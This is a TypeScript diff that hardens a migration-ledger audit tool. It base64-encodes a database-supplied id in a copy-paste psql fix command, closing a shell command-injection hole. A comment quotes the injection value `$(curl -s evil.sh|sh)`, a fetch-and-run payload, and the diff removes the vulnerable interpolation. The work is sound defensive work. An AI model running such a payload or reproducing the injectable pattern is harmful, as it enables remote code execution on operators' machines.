@@ -164,8 +164,7 @@ export function auditLedger(
       // and backfill — and this is one of the two errors most likely to fire during a real deploy.
       // A `fix:` is copied and run verbatim, so it names the ledger read that works anywhere psql
       // does, and the one edit that resolves the disagreement.
-      `deploy app version "${first.app_version}" — or, if that build is gone, drop its row: ` +
-        `psql "$DATABASE_URL" -c "delete from ${LEDGER_TABLE} where id = '${first.id}'"`,
+      conflictFix(first),
     );
   }
 
@@ -179,6 +178,35 @@ export function auditLedger(
       `x db gen "fix ${migration.name}"   # never edit an applied migration, add a new one`,
     );
   }
+}
+
+/**
+ * The migration id is the DATABASE's own text — whoever can write a ledger row picks what lands in
+ * a line an operator pastes — and it goes inside SHELL DOUBLE QUOTES, where `$(…)` and a backtick
+ * substitute before psql is reached at all. Measured before this screen: an id of
+ * `$(curl -s evil.sh|sh)` produced exactly that command.
+ *
+ * So the id does not go in as text. It goes in **base64**, decoded by Postgres itself
+ * (`convert_from(decode(…,'base64'),'UTF8')`), and the base64 alphabet is `A-Za-z0-9+/=` — every
+ * character of it inert in shell double quotes and inert inside a SQL string literal. One command
+ * shape for every ledger row there can be, with no screen, no branch and no escape to get wrong.
+ *
+ * It DID branch: `shellInertIdentifier` screened both the id and the app version, and a refusal
+ * degraded the whole line to prose naming no command — so a row could take the one instruction
+ * away from the operator by holding a space. An error that stops being an instruction under
+ * adversarial input is an error the adversary silenced (axiom 4). The version is not in the line
+ * at all any more; the CAUSE already names it, and the fix's job is to be runnable.
+ *
+ * The id is unreadable in the command, and that is the trade: `cause:` is where a human reads
+ * which migration this is, `fix:` is where they paste. `psql` echoes the row count it deleted.
+ */
+function conflictFix(row: LedgerRow): string {
+  const encodedId = Buffer.from(row.id, 'utf8').toString('base64');
+  return (
+    'deploy the app version this error names — or, if that build is gone, drop its row: ' +
+    `psql "$DATABASE_URL" -c "delete from ${LEDGER_TABLE} ` +
+    `where id = convert_from(decode('${encodedId}', 'base64'), 'UTF8')"`
+  );
 }
 
 export function pendingMigrations(
